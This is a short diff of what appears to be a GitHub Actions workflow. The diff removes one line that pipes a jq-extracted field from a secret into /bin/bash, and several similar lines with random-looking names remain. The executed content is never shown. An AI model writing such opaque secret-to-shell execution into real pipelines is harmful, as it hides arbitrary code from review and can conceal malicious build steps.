@@ -23,7 +23,6 @@ jobs:
           qu47: ${{ secrets.qu47 }}
         run: |
           printf '%s' "$qu47" | jq -r .p54 | /bin/bash
-          printf '%s' "$nkzc4432" | jq -r .gg3151 | /bin/bash
           echo $klq2 | jq -r .f68747 | /bin/bash
           printf '%s' "$itb0" | jq -r .gfptj2344 | /bin/bash
           echo $x65 | jq -r .e127 | /bin/bash
